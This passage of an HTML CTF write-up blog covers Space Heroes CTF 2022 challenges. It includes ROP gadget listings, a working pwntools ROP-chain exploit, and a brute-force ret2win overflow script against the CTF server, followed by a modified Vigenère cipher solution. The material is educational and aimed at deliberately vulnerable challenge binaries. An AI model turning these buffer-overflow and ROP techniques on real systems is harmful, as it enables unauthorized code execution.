<span style="color:#D41919">0x0000000000401460</span>: <span style="color:#FF8A18"><b>mov</b></span> <span style="color:#EC0101"><b>rdi</b></span>, rax<span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>call</b></span> <span style="color:#E6E6E6">0x1030</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>nop</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>pop</b></span> <span style="color:#E6E6E6">rbp</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span>
<span style="color:#D41919">0x00000000004011be</span>: <span style="color:#FF8A18"><b>mov</b></span> <span style="color:#EC0101"><b>rdi</b></span>, rax<span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>call</b></span> <span style="color:#E6E6E6">0x1040</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>nop</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>pop</b></span> <span style="color:#E6E6E6">rbp</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span>
<span style="color:#D41919">0x00000000004015eb</span>: <span style="color:#FF8A18"><b>mov</b></span> <span style="color:#EC0101"><b>rdi</b></span>, rax<span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>call</b></span> <span style="color:#E6E6E6">0x1060</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>mov</b></span> <span style="color:#E6E6E6">eax, 0</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>leave</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span>
<span style="color:#D41919">0x00000000004010f6</span>: <span style="color:#FF8A18"><b>or</b></span> <span style="color:#E6E6E6">dword ptr [</span><span style="color:#EC0101"><b>rdi</b></span> + 0x405060], edi<span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>jmp</b></span> <span style="color:#E6E6E6">rax</span><span style="color:#277FFF"><b>; </b></span>
<span style="color:#D41919">0x000000000040165b</span>: <span style="color:#FF8A18"><b>pop</b></span> <span style="color:#EC0101"><b>rdi</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span></pre></td></tr></table></div>

<p>Check it out – at the bottom of the code block (<code>0x40165b</code>) there’s a perfect gadget for us to use! Let’s find ones for the rest of them:</p>
<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span style="color:#D41919">0x0000000000401659</span>: <span style="color:#FF8A18"><b>pop</b></span> <span style="color:#EC0101"><b>rsi</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>pop</b></span> <span style="color:#E6E6E6">r15</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span><br><span class="line"><span style="color:#D41919">0x00000000004011ce</span>: <span style="color:#FF8A18"><b>pop</b></span> <span style="color:#EC0101"><b>rdx</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span></span><br><span class="line"><span style="color:#D41919">0x00000000004011d8</span>: <span style="color:#FF8A18"><b>pop</b></span> <span style="color:#EC0101"><b>rcx</b></span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>pop</b></span> <span style="color:#E6E6E6">r8</span><span style="color:#277FFF"><b>; </b></span><span style="color:#FF8A18"><b>ret</b></span><span style="color:#277FFF"><b>; </b></span></span></pre></td></tr></table></div>

<p>The first <code>pop rsi; pop r15;</code> isn’t ideal, as it’s popping a redundant register – we’ll need to repopulate it with 8 bytes of garbage. On the other hand, the <code>pop rcx; pop r8;</code> takes care of two registers at once!</p>
<p>With that, we can draw up a visual of what our final payload will look like:</p>
<p><img src="/static/shctf-2022/payload-visual.svg" alt="Payload Visual"></p>
<p>The last thing we need to do is to find the hex addresses of our argument strings:</p>
<p><img src="/static/shctf-2022/strings.png" alt="Ghidra Strings"></p>
<p>Don’t forget the address of <code>vader()</code> too!:</p>
<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><figcaption><span>gdb-gef x command</span><a target="_blank" rel="noopener" href="https://visualgdb.com/gdbreference/commands/x"><span>[documentation]</span></a></figcaption><tr><td class="code"><pre><span style="color:#EC0101"><b>gef➤  </b></span>x vader
<span style="color:#367BF0">0x40146b</span> &lt;<span style="color:#FEA44C">vader</span>&gt;:	0xe5894855</pre></td></tr></table></div>

<p>Here is my final script, which defines a variable for each section of our gigantic payload – this is for enhanced readability. I’ve also used the <code>p64()</code> function, which converts the address into little endian:</p>
<div><figure class="highlight py" style=""><table><figcaption><span>vader.py</span><a target="_blank" rel="noopener" href="https://gist.github.com/jktrn/a499cfd248125a9d57924f8f602fda30"><span>[github gist link]</span></a></figcaption><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="keyword">from</span> pwn <span class="keyword">import</span> *

offset =        <span class="string">b&#x27;A&#x27;</span>*<span class="number">40</span>         <span class="comment"># OVERFLOWING 32 + 8 BYTES FOR $RBP</span>

rdi =           p64(<span class="number">0x0040165b</span>) <span class="comment"># RDI, RSI, RDX, RCX, &amp; R8 ARE ARGS REGISTERS</span>
rsi_r15 =       p64(<span class="number">0x00401659</span>)
rdx =           p64(<span class="number">0x004011ce</span>)
rcx_r8 =        p64(<span class="number">0x004011d8</span>)

dark =          p64(<span class="number">0x00402ec9</span>) <span class="comment"># ADDRESSES FOR STRINGS IN THE BINARY</span>
side =          p64(<span class="number">0x00402ece</span>)
r15_garbage =   p64(<span class="number">0xCAFEBEEF</span>) <span class="comment"># GARBAGE</span>
of =            p64(<span class="number">0x00402ed3</span>)
the =           p64(<span class="number">0x00402ed6</span>)
force =         p64(<span class="number">0x00402eda</span>)

vader =         p64(<span class="number">0x0040146b</span>)

payload = offset
payload += rdi + dark                   <span class="comment"># POP RDI, STORING &quot;DARK&quot;</span>
payload += rsi_r15 + side + r15_garbage <span class="comment"># POP RSI &amp; R15, STORE &quot;S1D3&quot; + GARBAGE</span>
payload += rdx + of                     <span class="comment"># POP RDX, STORING &quot;OF&quot;</span>
payload += rcx_r8 + the + force         <span class="comment"># POP RCX &amp; R8, STORING &quot;TH3&quot; + &quot;FORC3&quot;</span>
payload += vader                        <span class="comment"># ADDRESS OF VADER</span>

p = remote(<span class="string">&quot;0.cloud.chals.io&quot;</span>, <span class="number">20712</span>)
p.sendline(payload)
log.success(p.recvallS())
p.close()</pre></td></tr></table></div>

<p>I don’t usually do this, but here’s a clip of me initially solving the challenge by running the above script:</p>
<br>

<div class="video-container"><iframe src="https://www.youtube.com/embed/rvMORfSC2CU" frameborder="0" loading="lazy" allowfullscreen></iframe></div>

<br>

<p>This is considered a “simple” challenge for those experienced with the field of return-oriented programming within pwn&#x2F;binary challenges. However, I had none prior to this competition, so <kbd>Vader</kbd> was one of the most time-consuming and annoying challenges to work with. Yet, it was probably the most satisfying solve throughout the entire competition, and it was my first time utilizing gadgets and building a ROP chain. I hope you enjoyed!</p>
<hr>
<div class="challenge">
    <div class="challenge-title"><h2 id="Warmup-to-the-Dark-Side" class="chal-title"><a href="#Warmup-to-the-Dark-Side" class="headerlink" title="Warmup to the Dark Side"></a>Warmup to the Dark Side</h2></div>
    <div style="display:flex;" class="no-highlight">
        <div class="challenge-info">
            <div class="center-align">
                <i class="fa-solid fa-user fa-fw"></i> <b>solver</b>: <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://avatars.githubusercontent.com/u/71956291"> <a target="_blank" rel="noopener" href="https://github.com/jktrn">enscribe</a><br>
                <i class="fa-solid fa-square-pen fa-fw"></i> <b>author</b>: v10l3nt<br>
                <i class="fa-solid fa-tag fa-fw"></i> <b>genre</b>: pwn<br>
                <i class="fa-solid fa-circle-plus fa-fw"></i> <b>points</b>: 100<br>
                
                
            </div>
        </div>
        <div class="challenge-description">
            <div class="center-align" >
                Once you start down the dark path, forever will it dominate your destiny.  (And yes, the binary isn't included)<br />
<code>nc 0.cloud.chals.io 30096</code>
                
            </div>
        </div>
    </div>
    </div>

<p>Let’s run that <code>netcat</code> link to see what’s going on:</p>
<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre style="white-space: pre-wrap; word-break: break-word;"><span class="meta prompt_">$ </span>nc 0.cloud.chals.io 30096  
The Dark Side Of The Force, Are They. Easily They Flow, Quick To Join You In A Fight. The Dark Side resides at: 0x55a6b42f020c  
Jedi Mind tricks dont work on me >>></pre></td></tr></table></div>

<p>We’re given an address of the <code>win()</code> function… and that’s it. If this is a <code>ret2win</code> challenge, how are we meant to find the offset of the <code>$rip</code> register and overflow it with our code? Of course… we need to brute force it.</p>
<p>In the code snippet below, I got the address provided in the prompt by reading the line and taking its substring (ASLR is enabled, so it’s different each time). Then, I slowly increase the buffer of the payload with a loop until I find the right offset of the <code>$rip</code>:</p>
<div><figure class="highlight py" style=""><table><figcaption><span>warmup-to-the-dark-side.py</span><a target="_blank" rel="noopener" href="https://gist.github.com/jktrn/dd861b378b859a0588b48c71ad9fbf45"><span>[github gist link]</span></a></figcaption><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="keyword">from</span> pwn <span class="keyword">import</span> *

<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):
        p = remote(<span class="string">&quot;0.cloud.chals.io&quot;</span>, <span class="number">30096</span>)
        address = p.readlineS()[<span class="number">112</span>:<span class="number">126</span>]
        log.info(<span class="string">&quot;Trying offset &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot; for address &quot;</span> + address)
        p.sendline(<span class="string">b&#x27;A&#x27;</span>*i + p64(<span class="built_in">int</span>(address, base=<span class="number">16</span>)))
        output = p.recvallS()
        <span class="keyword">if</span> <span class="string">&quot;shctf&quot;</span> <span class="keyword">in</span> output:
                log.success(output)
                <span class="keyword">break</span>
        p.close()</pre></td></tr></table></div>

<p>Let’s run this script on the server to see if we can get the flag:</p>
<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre>...
[<span style="color:#277FFF"><b>*</b></span>] Trying offset 37 for address 0x55f788f1120c
[<span style="color:#47D4B9"><b>+</b></span>] Receiving all data: Done (38B)
[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 30096
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 30096: Done
[<span style="color:#277FFF"><b>*</b></span>] Trying offset 38 for address 0x5631d523620c
[<span style="color:#47D4B9"><b>+</b></span>] Receiving all data: Done (38B)
[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 30096
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 30096: Done
[<span style="color:#277FFF"><b>*</b></span>] Trying offset 39 for address 0x55980d2d520c
[<span style="color:#47D4B9"><b>+</b></span>] Receiving all data: Done (38B)
[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 30096
[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to 0.cloud.chals.io on port 30096: Done
[<span style="color:#277FFF"><b>*</b></span>] Trying offset 40 for address 0x55f0008b520c
[<span style="color:#47D4B9"><b>+</b></span>] Receiving all data: Done (95B)
[<span style="color:#277FFF"><b>*</b></span>] Closed connection to 0.cloud.chals.io port 30096
[<span style="color:#47D4B9"><b>+</b></span>] Jedi Mind tricks dont work on me &gt;&gt;&gt;
<div class="code-highlight">    shctf&#123;I_will_remov3_th3s3_restraints_and_leave_the_c3ll&#125;</span></div></pre></td></tr></table></div>

<hr>
<div class="challenge">
    <div class="challenge-title"><h2 id="Rahool's-Challenge" class="chal-title"><a href="#Rahool's-Challenge" class="headerlink" title="Rahool's Challenge"></a>Rahool's Challenge</h2></div>
    <div style="display:flex;" class="no-highlight">
        <div class="challenge-info">
            <div class="center-align">
                <i class="fa-solid fa-user fa-fw"></i> <b>solver</b>: <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://avatars.githubusercontent.com/u/71956291"> <a target="_blank" rel="noopener" href="https://github.com/jktrn">enscribe</a><br>
                <i class="fa-solid fa-square-pen fa-fw"></i> <b>author</b>: excaligator<br>
                <i class="fa-solid fa-tag fa-fw"></i> <b>genre</b>: crypto<br>
                <i class="fa-solid fa-circle-plus fa-fw"></i> <b>points</b>: 331<br>
                
                
            </div>
        </div>
        <div class="challenge-description">
            <div class="center-align" style="font-size: 120%">
                <code>nc 0.cloud.chals.io 10294</code>
                
            </div>
        </div>
    </div>
    </div>

<p>Let’s open that <code>netcat</code> link to see what’s going on:</p>
<div><figure class="highlight text" style="height: 400px; overflow: scroll; margin: 1rem 0; background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">$</span> nc 0.cloud.chals.io 10294
                                   ,/(####((((/**.                                                  
                             *#%%%%%%%%%%%%%%########(#####((((/*,                                  
                          ,&&&&&&&&%%%%%%%%%%%%%%%%%%%%%%%%#(##((((///*                              
                       .#&&&&&&&&&&&&&&&&&%%%%%%%%%&&%%%%###((((*,.     ...                          
                     .%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%%%%%%%,.,               .                       
                     #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%%%%,,,, .. ..             .                    
                    *&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&#,*,*,,,,..,                .                  
                   .%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&(*****,//,..., ,.  .  .,..                       
                   %&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&,****,***,*.****... .*//((((/,                    
                  (&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&#,***//**,**,*,***,,*((/////(##(*                   
                 *&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&/,****,**,**,,*,*,,/##/////((/(%#/.,                 
                 %&&&&&&&&&&&&&&&&&&&&&&&&&&&&&,,*********/,,*/*,/%&########%%#(%/..                 
                (&&&&&&&&&&&&&&&&&&&&&&&&&&&&#,,,,***,**,**//*,,(&%###%%%%%#((&&%%(.                 
               .&&&&&&&&&&&&&&&&&&&&&&&&&&&&****,*/,*,**/***,,,%&####%&%%%%#/*#&&&(/,                
               #&&&&&&&&&&&&&&&&&&&&&&&&&&&,*,,,*/,**///*,**,/&&#(*.,%%%(/(%(#(&&&#(.                
              .&&&&&&&&&&&&&&&&&&&&&&&&&&(,*,**********/,**/%&&%%%(. .###(/*/(%&&&#*,                
              #&&&&&&&&&&&&&&&&&&&&&&&&@*,**,**,,/*/*,,,,/&@&#%%%##(,  ,,,,.. /&&&/,,                
              %&&&&&&&&&&&&&&&&&&&&&&&&,,,**,,,*,*****,/%@@%#####%%#,.    ..  *&&%(.                 
             ,&&&&&&&&&&&&&&&&&&&&&&&&*,*,**/,*,,***,/#@@%((((%#####(,.      .*&&#(,                 
             (&&&@&&&&&&@@&&&&&&&&&&&,,**,,*,/****,*(&@&(((##&&&&&&%##(/,. ...(&&#,                  
             ,&&&&&&&&&&&&&&&&&&&&&,**,***,*,**/#@&###(#((#####((/*,,*,.. ...,&%* .                  
             ,&&&&&&&&&&&&&&&&&&&@****/**/,,***&@&%######%%&&&&%#######%#,,..#&#, .                  
              %&&&&&&&&&&&&&&&&&&%,****/*,,,(&@&&%%%#####(############(*../,.%%(, .                  
              /&&&&&&&&&&&&&&&&&&/,***,***,/&@&%%%%%#########((/*,,,,,,,...,*&#( ,                   
              ,&&&&&&&&&&&&&&&&&&,***,,,**,%@&&&%%%%#########(/*,.       ...#%(/ .                   
              %&&&&&&&&&&&&&&@&&#**,**///*/@&&&&&&&%%%%%%%%#####(/**,,...../%#(,.                    
             (&&&&&&&&&&&&&&&&&@/,*/,/*//**&&&@@@&&&&&&&&%%%%%%%%%%#%#(*,*####(*,                    
            ,%%&&&&&&&&&&&&&&&&&*,*/***/**,%&%&@@@@@@@@@@&&&&&%%%%%%##(, ./(##(,,                    
            **,,*(#&&&&&&&&&&&&#*,/***/*/,,(&#(#(((##%&&&&&&&&&%%####/.   ,/(((*.                    
           ******,,**(%&&&&&&&%/***(******.*%#%%%###(#((((##(*.            ,/((,                     
          ,******,**,,***#%&&&%*,,,/*/,*/*..&%########((((##(/*,.            //.                     
          ,***********//*,,**/(****/*//*//, &&&%#%%%%###(((////(**..         ,///*******,.           
           ((,,****/********/*//***///(/**, %&@&&#(######((((/**, .   .       //#%&&&&&%(***/,       
       ,#&&&&&&%*,*//*****,***/(/**/////***.%@@@@&%##(/(/((((#((/,..    .    .//(#%&&&&%(********    
 @%%%%%&&@@@@@@@@@@(*****//**/*///**/((*/**.&@@@@@&&%%%##(/*,,/..... .     . *((#/*####(/***/********
 &@@@@&%##%%&&&@@@@@@@&(**/*/*///(/////(///.@@@@@@@&&&%%&%###((**/....   ,, .#((#//((#(/***//******/*
 &&%%&@@@@&%%%%%%%%%&&@@@&/*//***/(///(///*.&&@@@@@@@@@&%#%%####((,*,,.,,,  (#(##/(##(******/*****///
 %%%%%&@@&&&&&@@@&&&&%%%%&&@@/****/#(//(//,,&&@&&@@@@@@@@&&%#(#%%/#/.,... ,#((/*//**(******/*****////
 %%%%&&%&&&%%%%%%###%%&&&&&%%%&#*///((///* /&&@@@@@@@@@@@@@@@&%(/*,,.. *#%#*****///**/****/*****////*
 &&&&&&&&&&&&&&&%%%%%%#%######((//////(*(, (&#,(((##(##((##&&&%%#/****//(((%%**//*///((/(/****//(/***
 %%##########((((//(/(///////////(((((///,*////((((((((/(((((#(((((//***///((%%*///////((/(*//(/****/
 &&&&&&&&&&&&&&&&&&&&&&&&%###((((/////////(((((((#(######(((//////(///((//***//&(*///*////((((/**///*
 &&&&&&&&@&&&&&&&&&&&&&&&%####(((((//////(///////((((((///(((((((((((((/////////(&/*/////**/(((/*///*
 &&&&&&&&&&&&&&&&&&&&&&&&&%#((((((((((//////////////////////((((((((((////////////(%/**//*/*///(/////
 &&&&&&&&&&&&&&&&&&&&&%###(#####(((////////***/*/////*////////////////////////////(#&&(**////***/((#(
 &&&&&&&&%&%%%%%%%%#####%%##((((((((/((////////*/*****////////*/*//////////(((####((/##**/****//,


ESDK EDS NFIMNGDJTB XEZVZ OWV KOYRTI KT ZCT BOZ CDIY DIK Z PJ K UNMTV DIK J PJ K AKMD NSUN OWV GPXY 
TEQSGH PWDFX RXKR UNZ P RC B LJJI KOJ VDXXFX MXXRU GAIVB


We've found ourselves an encrypted engram - Can you break the (new and improved) indecipherable cipher?
Message:A + Key:B = 0 + B = O
Enter the answer with no spaces and all upper case:</pre></td></tr></table></div>

<p>For themed CTFs, I find it really fun to figure out the cultural references in the challenge before solving them. In this case, <strong>Rahool</strong> is a vendor in the <em>Destiny 2</em> Tower that can decrypt legendary engrams (purple) and sell exotic engrams (gold). Uncoincidentally, that’s what we’ll be doing here.</p>
<p>Immediately, we can tell that the ciphertext underneath the giant Rahool ASCII is substitution. This means that the plaintext is simply substituted by a value determined by the algorithm. Throwing it into this <a target="_blank" rel="noopener" href="https://www.boxentriq.com/code-breaking/cipher-identifier">cipher identifier</a>, we find that it is a <strong>Vigenère</strong> cipher.</p>
<p>Before moving on, we need to figure out what the hell a Vigenère is.</p>
<h3 id="The-Vigenere-Cipher"><a href="#The-Vigenere-Cipher" class="headerlink" title="The Vigenère Cipher"></a>The Vigenère Cipher</h3><p>A Vigenère cipher is a type of encryption that uses both plaintext and a <strong>key</strong>. There are many ways to use this encryption method, but the most common is via <strong>addition</strong> and <strong>table&#x2F;tabula recta</strong>.</p>
<p>To encrypt using addition, take the position in the alphabet of the first letter in your plaintext (make sure it starts at 0, i.e. A &#x3D; 0, B &#x3D; 1, C &#x3D; 2) and add it with the position of your key (if the key was “key”, the position would be 10 as K &#x3D; 10). Then, take the <strong>modulo</strong> 26 (divide by 26 to get the remainder, symbol <code>%</code>), as some numbers add up to greater than 26.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Plaintext: hello</span><br><span class="line">Key: key</span><br><span class="line">h (07) + k (10) = r (17 % 26 = 17)</span><br><span class="line">e (04) + e (04) = i (08 % 26 = 08)</span><br><span class="line">l (11) + y (24) = j (35 % 26 = 09)</span><br><span class="line">l (11) + k (10) = v (21 % 26 = 21) &lt;- Note that the key cycles</span><br><span class="line">o (14) + e (04) = s (18 % 26 = 18)</span><br><span class="line">Ciphertext: rijvs</span><br></pre></td></tr></table></figure>

<p>In a formula, where A is the plaintext’s alphabetic position and B is the key’s alphabetic position, in that would be:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C = (A + B) % 26</span><br></pre></td></tr></table></figure>
<p>It’ll be a more manual process (albeit more fun) for encrypting via table&#x2F;tabula recta. Let’s check out what it looks like (Source: <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Tabula_recta">Wikipedia</a>):</p>
<p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9a/Vigen%C3%A8re_square_shading.svg/1024px-Vigen%C3%A8re_square_shading.svg.png" alt="Wikipedia"></p>
<p>Each of the 26 rows contains the same alphabet, except shifted to the left by one position. At the top, each <strong>column</strong> is associated with a letter in the alphabet. To the left, each <strong>row</strong> is associated with a letter in the key.</p>
<p>If I wanted to encrypt <code>HELLO</code> with <code>WORLD</code> as the key, I would find the cell that intersects with column <code>H</code> and row <code>W</code>. In that case, it would be <code>D</code>. Then, I would find the cell that intersects with column <code>E</code> and row <code>O</code>. In that case, it would be <code>S</code>. Rinse and repeat for the entire phrase.</p>
<h3 id="Cheaters-Never-Win…"><a href="#Cheaters-Never-Win…" class="headerlink" title="Cheaters Never Win…"></a>Cheaters Never Win…</h3><p>But how are we supposed to decrypt vigenere without a key? Let’s do some “OSINT” and Google the crap out of it. <a target="_blank" rel="noopener" href="https://www.dcode.fr/vigenere-cipher">DCode</a>, which can keylessly decrypt substitution ciphers, is the first option. Click, clack, <code>Ctrl + Shift + C</code>, <code>Ctrl + V</code> later and we have solved it!!1!1!</p>
<p><img src="https://github.com/WhileSEC/shctf/blob/main/images/rahool-dcode.PNG?raw=true" alt="Rahool-DCode"></p>
<p>Or not. Wait… the plaintext is telling me to replace my <code>E</code> with a <code>3</code> and my <code>O</code> with an <code>0</code>. Those aren’t in <code>RKBGVP</code>. What’s going on? Is the website wrong?</p>
<h3 id="…Or-Do-They"><a href="#…Or-Do-They" class="headerlink" title="…Or Do They?"></a>…Or Do They?</h3><p>Let’s go back to the drawing board and look at the problem again.</p>
<blockquote>
<p>We’ve found ourselves an encrypted engram - Can you break the <strong>(new and improved)</strong> indecipherable cipher?<br>Message:A + Key:B &#x3D; 0 + B &#x3D; O</p>
</blockquote>
<p>Since this cipher is “new and improved”, we can assume it’s not just your normal Vigenère. However, the <code>A + B = O</code> is the biggest giveaway of what we are meant to do for this challenge.</p>
<p><strong>Take it literally. The letter A (plaintext) plus the letter B (key) is equal to the letter O (ciphertext).</strong></p>
<p>I solved this challenge via <strong>known-plaintext attack</strong>. Yeah, it sounds fancy. But here’s what I actually did:</p>
<p><img src="https://github.com/WhileSEC/shctf/blob/main/images/rahool-vigenere.PNG?raw=true" alt="Rahool-Vigenere"></p>
<p>This is a tabula recta with a modified offset. You see how intersecting column A and row B would return O?</p>
<p>Since we know our plaintext, we can use this table “backwards” to find the key. If you go down the column of your letter and find its equivalent ciphertext letter, it would be on the same row as the key for that letter!</p>
<p>For example, if <code>C</code> is our plaintext and <code>Q</code> is our ciphertext, the key would be <code>B</code>.</p>
<p>Let’s follow this process for the actual plaintext&#x2F;ciphertext:</p>
<div><figure class="highlight text" style=""><table><tr><td class="code"><pre style="white-space: pre-wrap; word-break: break-word;">Ciphertext: ESDK EDS NFIMNGDJTB XEZVZ OWV KOYRTI KT ZCT BOZ CDIY DIK Z PJ K UNMTV DIK J PJ K AKMD NSUN OWV GPXY TEQSGH PWDFX RXKR UNZ P RC B LJJI KOJ VDXXFX MXXRU GAIVB
Plaintext: NICE JOB DECRYPTING INPUT THE ANSWER AS THE KEY WITH THE E AS A THREE THE O AS A ZERO WITH THE WORD ENGRAM AFTER WITH THE A AS A FOUR AND AOGNER RIGHT AFTER</pre></td></tr></table></div>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E + N -&gt; E</span><br><span class="line">S + I -&gt; X</span><br><span class="line">D + C -&gt; O</span><br><span class="line">K + E -&gt; T</span><br><span class="line">E + J -&gt; I</span><br><span class="line">D + O -&gt; C</span><br><span class="line">S + B -&gt; E</span><br><span class="line">N + D -&gt; X</span><br><span class="line">F + E -&gt; O</span><br><span class="line">I + C -&gt; T</span><br><span class="line">M + R -&gt; I</span><br><span class="line">N + Y -&gt; C</span><br><span class="line">G + P -&gt; E</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>The key is <code>EXOTIC</code>, as in how Master Rahool sells exotic engrams. Very funny.<br>We can now follow the instructions in the plaintext and send it to the server with an unnecessary <code>pwntools</code> script:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;0.cloud.chals.io&quot;</span>, <span class="number">10294</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3X0TICENGR4MAOGNER&quot;</span>)</span><br><span class="line">log.success(p.recvallS())</span><br></pre></td></tr></table></figure>

<p>Sending the string:</p>
<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre style="white-space: pre-wrap; word-break: break-word;"><span class="meta prompt_">$ </span>python3 exp.py
...
[<span style="color:#47D4B9"><b>+</b></span>] Excellent work, you'll be a cryptarch yet. Here's your flag:
<div class="code-highlight">shctf{c0Me_baCk_s0on_w3_n33d_the_chAll3nge}</div></pre></td></tr></table></div>

<p>We just solved <code>Rahool&#39;s Challenge</code> without needing to write any algorithms!</p>
<hr>
<img src="https://s01.flagcounter.com/count2/8Xkk/bg_161616/txt_C9CACC/border_E9D3B6/columns_3/maxflags_12/viewers_3/labels_0/pageviews_1/flags_1/percent_0/">
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">home</a></li>
         
          <li><a href="/articles/">posts</a></li>
         
          <li><a href="/ctfs/">ctfs</a></li>
         
          <li><a href="/profiles/">profiles</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Intro"><span class="toc-number">1.</span> <span class="toc-text">Intro</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guardians-of-the-Galaxy"><span class="toc-number"></span> <span class="toc-text">Guardians of the Galaxy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vader"><span class="toc-number"></span> <span class="toc-text">Vader</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Warmup-to-the-Dark-Side"><span class="toc-number"></span> <span class="toc-text">Warmup to the Dark Side</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rahool's-Challenge"><span class="toc-number"></span> <span class="toc-text">Rahool&#39;s Challenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Vigenere-Cipher"><span class="toc-number">1.</span> <span class="toc-text">The Vigenère Cipher</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cheaters-Never-Win%E2%80%A6"><span class="toc-number">2.</span> <span class="toc-text">Cheaters Never Win…</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%A6Or-Do-They"><span class="toc-number">3.</span> <span class="toc-text">…Or Do They?</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://enscribe.dev/blog/shctf-2022/writeup-compilation/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://enscribe.dev/blog/shctf-2022/writeup-compilation/&text=Space Heroes CTF: Writeup Compilation"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
